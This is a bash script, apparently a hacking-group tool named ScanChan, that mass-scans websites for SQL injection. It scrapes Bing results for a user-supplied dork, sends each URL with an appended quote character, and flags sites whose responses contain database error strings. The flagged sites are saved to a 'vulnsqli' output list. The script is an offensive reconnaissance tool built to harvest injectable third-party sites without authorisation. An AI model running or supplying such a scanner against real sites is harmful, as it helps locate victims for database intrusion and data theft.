#!/bin/bash
# c0ded by : shutdown57

#dos2unix $0 > /dev/null 2>&1

# COLOR | WARNA
m="\e[0;31m" # merah
k="\e[0;33m" # kuning
h="\e[0;32m" # hijau
b="\e[0;34m" # biru
lm="\e[1;31m" # merah terang
lk="\e[1;33m" # kuning terang
lh="\e[1;32m" # hijau terang
lb="\e[1;34m" # biru terang seterang masa depan kita.
n="\e[0m" # clear / netral
w="\e[1;37m" # putih tebal
error=('You have an error in your SQL','supplied argument is not a valid MySQL result resource in','Division by zero in','Call to a member function','Microsoft JET Database','ODBC Microsoft Access Driver','Microsoft OLE DB Provider for SQL Server','Unclosed quotation mark','Microsoft OLE DB Provider for Oracle','Incorrect syntax near','Warning: filesize()','Warning: preg_match()','Warning: array_merge()','Warning: mysql_query()','Warning: mysql_num_rows()','Warning: session_start()','Warning: getimagesize()','Warning: mysql_fetch_array()','Warning: mysql_fetch_assoc()','Warning: is_writable()','Warning: Unknown()','Warning: mysql_result()','Warning: pg_exec()','Warning: require()')
CekDepen()
{
	if [[ -f "dependencies.sc" ]]; then
		sleep 1
	else
		echo -e $lb"[i]$n Checking Dependencies ..."
		touch "dependencies.sc"
		sleep 2
		curl --help > /dev/null 2>&1
		if [[ $? -eq 0 ]]; then
			echo -e $lh"[+]$n CURL ............... OK !"
			echo "curl=ok" >> "dependencies.sc"
		else
			echo -e $lm"[-]$n CURL ............... KO !"
			sleep 2
			clear
			sudo apt-get install curl -y
		fi
		sleep 3
		
	fi

}
BanNer(){
	clear
	printf "
 ____                   ____ _                 
/ ___|  ___ __ _ _ __  / ___| |__   __ _ _ __  
\___ \ / __/ _' | '_ \| |   | '_ \ / _' | '_ \ 
 ___) | (_| (_| | | | | |___| | | | (_| | | | |
|____/ \___\__,_|_| |_|\____|_| |_|\__,_|_| |_|
                                               
+==[ Automated tools for scan SQL injection ]==+

"

}
SimPanKntl()
{
	mkdir output > /dev/null 2>&1
	chmod 755 -R output > /dev/null 2>&1
	nama="output/vulnsqli-"$(date +%d%m)
	echo ${1} >> $nama.txt
}
BingDorker()
{
	local curl=`curl "http://www.bing.com/search?q=${2}&first=${1}1" -s`
	local gets=$(echo $curl | grep -Po "(?<=<h2><a href=\")[^\"]*")
	for url in $gets
	do
		echo $url | grep "bing" > /dev/null
		if [[ $? -eq 0 ]]; then
			echo ""
		else
			sleep 1
			#echo -e "["$b" CHECK "$n"] ...................................."
			CekSQLi $url ${1} ${3}
		fi
	done
}
CekSQLi()
{

local cekErr=`curl -s "${1}'"`
echo "---------------------------" >> "log.txt"
echo "${1}" >> "log.txt"
echo "===========================" >> "log.txt"
echo  $cekErr >> "log.txt"
echo "===========================" >> "log.txt"
echo "c0ded by shutdown57        " >> "log.txt"
echo "---------------------------" >> "log.txt"
IFS="," read -r -a err <<< "${error[*]}"
#echo ${err[2]}
while [ "x${err[count]}" != "x" ]
do
   count=$(( $count + 1 ))
done
	#echo ${err[$i]}
	if [[   $cekErr =~ ${err[0]} ||
			$cekErr =~ ${err[1]} ||
			$cekErr =~ ${err[2]} ||
			$cekErr =~ ${err[3]} ||
			$cekErr =~ ${err[3]} ||
			$cekErr =~ ${err[4]} ||
			$cekErr =~ ${err[5]} || 
			$cekErr =~ ${err[6]} ||
			$cekErr =~ ${err[7]} ||
			$cekErr =~ ${err[8]} ||
			$cekErr =~ ${err[9]} ||
			$cekErr =~ ${err[10]} ||
			$cekErr =~ ${err[11]} ||
			$cekErr =~ ${err[12]} ||
			$cekErr =~ ${err[13]} ||
			$cekErr =~ ${err[14]} ||
			$cekErr =~ ${err[15]} ||
			$cekErr =~ ${err[16]} ||
			$cekErr =~ ${err[17]} ||
			$cekErr =~ ${err[18]} ||
			$cekErr =~ ${err[19]} ||
			$cekErr =~ ${err[20]} ||
			$cekErr =~ ${err[21]} ||
			$cekErr =~ ${err[22]} ]]; then
		Serror=1
	else
		Serror=0
	fi
if [[ $Serror == 1 ]]; then
	echo -e "[ ${2}/${3} | "$lh" VULN "$n"] : ${1} "
	SimPanKntl "${1}"
else
	echo -e "[ ${2}/${3} | "$lm" NOOT "$n"] : ${1} "
	
fi
}

CekDepen
BanNer
echo -n "Dork :"
read dork
echo -n "Page :"
read page 


for (( i = 0; i <= $page ; i++ )); do
	((cthread=cthread%10)); ((cthread++==0)) && wait
	BingDorker $i $dork ${page} &
done
#BingDorker